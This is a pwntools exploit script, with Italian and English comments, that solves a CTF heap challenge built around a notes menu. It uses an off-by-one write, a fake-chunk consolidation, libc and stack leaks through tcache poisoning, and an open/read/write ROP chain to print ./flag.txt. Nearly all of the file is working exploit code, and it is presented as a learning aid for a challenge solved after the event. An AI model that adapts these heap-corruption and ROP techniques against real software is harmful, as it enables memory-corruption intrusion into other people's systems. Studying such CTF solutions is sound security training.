#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db sym.main; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


io = start()
line = b"> "
line2 = b": "
max_size = 1024
stdsize = 48


def create_note(idx, size, content):
    io.sendlineafter(line, b'1')
    io.sendlineafter(line2, str(idx).encode())
    io.sendlineafter(line2, str(size).encode())
    io.sendlineafter(line2, content)

def delete_note(idx):
    io.sendlineafter(line,  b'2')
    io.sendlineafter(line2, str(idx).encode())

def read_note(idx, use_size = False, default_size = 100):
    io.sendlineafter(line,  b'3')
    io.sendlineafter(line2, str(idx).encode())
    io.recvuntil(b"Data: ")
    if not use_size:
        leak = u64(io.recv(8).ljust(8, b'\x00'))
        return leak
    return io.recv(default_size)

def edit_note(idx, content):
    io.sendlineafter(line,  b'4')
    io.sendlineafter(line2, str(idx).encode())
    io.sendlineafter(line2, content)

def get_dump(idx, size):
    dump = read_note(idx, True, size)
    dump = [u64(dump[i:i+8].ljust(8, b'\x00')) for i in range(0, size, 8)]
    return dump

'''
DISCLAIMER! 
This challenge was solved AFTER the ctf's end.
This solve was built on the OLD DOCKER version, not working
on the newest. The problem is relative to correct offsets calculation
but the steps are the same. 

Use this code to learn the steps.

With this, i want to thank a very gentle person who helped me to understand
better this chall and where i did wrong.

Thank you, S.
'''



# with this size i can can use the off by one bug
# to hit the prevInuse field of the next size's block
size = 0x4f8

# a wall of blocks to avoid strange coalescing
for i in range(5):
    create_note(i, size, (chr(ord('a')+i)*size).encode())

# leak: freeing the large bins to have a double link to leak
delete_note(0)
delete_note(1)

# note 0 
# fd = libc and bk = libc
# fd_nextsize == bk_nextsize == current location
create_note(0, size, b'')
create_note(1, size, b'')

chunk_content = get_dump(0, size)
libc_leak = chunk_content[1]
chunk_A = chunk_content[2]
chunk_B = chunk_A + 0x500
chunk_C = chunk_B + 0x500
fake_chunk = chunk_B + 0x10
libc_malloc = libc_leak - 1314920
libc.address = libc_malloc - libc.sym['malloc']

success(f"libc leak  @ {hex(libc_leak)}")
success(f"chunk A    @ {hex(chunk_A)}")
success(f"chunk B    @ {hex(chunk_B)}")
success(f"chunk C    @ {hex(chunk_C)}")
success(f"fake chunk @ {hex(fake_chunk)}")
success(f"libc base  @ {hex(libc.address)}")
success(f"libc envrn @ {hex(libc.sym['environ'])}")

prev_size = 0
real_size = 0x501             # this is the size of the chunk in the heap 
fake_size = real_size - 0x10  # realsize - the offset for the userdata segment
fd = bk = chunk_B+0x10        # fd and bk points to the header of the fake chunk
fake_prevsize = 0x4f0         # the chunk C pointer jump size to reach fake chunk


fake_chunk_content = flat([
    prev_size, fake_size,     # header of the fake chunk
    fd       ,bk        ,     # pointers pointing to the same point
    b'\x00'*(size - 40),      # size - 40 cause of prev, fake, fd, and fake prev size (8*5)
    fake_prevsize,
    ])

edit_note(1, fake_chunk_content)
delete_note(2)

'''
Now at this point, my chunk B contains a freed big chunk.
The next step is fragment the big chunk by allocating smaller chunks.

With this, i can overwrite the pointers to allocate where i want.
'''
# i'll use this size 'cause i'll put the ropchain inside it
size = 0x1f8
create_note(6, size, b'smoll chunk 1'.ljust(32, b'\x00')) 
create_note(7, size, b'smoll chunk 2'.ljust(32, b'\x00')) 
create_note(8, size, b'smoll chunk 3'.ljust(32, b'\x00')) 

# this last chunk is the one that i'll use as buffer to read
# the flag. For now it will contain the flag file name 
create_note(9, size, b'./flag.txt'.ljust(32, b'\x00')) 


# tcache -> chunk 6 -> chunk 7 -> end
delete_note(7)
delete_note(6)
address_location = fake_chunk+0x10

# allign the last 4 byte to 0 and shift the address 
# to not override the value inside environ
alligned_environ = (libc.sym['environ']& ~0xf) - 0x30
fake_next = (address_location >> 12) ^ alligned_environ
real_size = size + 8 + 1 

fake_chunk_content = flat([
    0, real_size,
    fake_next,
    ])

edit_note(1, fake_chunk_content)

create_note(6, size, b'') 
create_note(7, size, b'') # chunk 7 will be allocated in the environ section
dump = get_dump(7, size)
stack_ref = dump[7]       # read all the content to get the stack ref
success(f"stack leak @ {hex(stack_ref)}")


# tcache -> chunk 6 -> chunk 8 -> end
delete_note(8)
delete_note(6)

return_address = (stack_ref-400) & ~0xf
success(f"return ptr @ {hex(return_address)}")

# i want to land near a sensible area of return 
# idk what function does store his return here, 
# but it works without need to check for canary
# i guess it's luck

fake_next = (address_location >> 12) ^ return_address
fake_chunk_content = flat([
    0, real_size,
    fake_next
    ])

edit_note(1, fake_chunk_content)
create_note(6, size, b'') 

flag_str = chunk_B + 0x620
rop = ROP(libc)

syscall_ret = next(libc.search(asm('syscall; ret')))
pop_rdi = rop.rdi[0]
pop_rsi = rop.rsi[0]
# i found no pop rdx; ret; so i had to use this via ropper
pop_rdx = next(libc.search(asm('pop rdx; xor eax, eax; ret;')))
pop_rax = rop.rax[0]
bof_offset = 24

info(f"pop rax @ {hex(pop_rax)}")

payload = flat({bof_offset:
    [
    # open('./flag.txt', 'r')
    pop_rdi, flag_str,
    pop_rsi, 0,
    pop_rdx, 0,
    pop_rax, constants.SYS_open,
    syscall_ret,

    # read(fd, flag_str, 100)
    pop_rdi, 3,
    pop_rsi, flag_str,
    pop_rdx, 100,
    pop_rax, constants.SYS_read,
    syscall_ret,

    # write(stdout, flag_str, 100)
    pop_rdi, 1,
    pop_rsi, flag_str,
    pop_rdx, 100,
    pop_rax, constants.SYS_write,
    syscall_ret,

    # exit(0)
    pop_rdi, 0,
    pop_rax, constants.SYS_exit,
    syscall_ret,   
    ]})

create_note(8, size, b'') # chunk 8 will be in the stack
edit_note(8, payload)

data = io.recvregex(rb'0xfun\{.*\}', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag.txt', flag)
io.close()
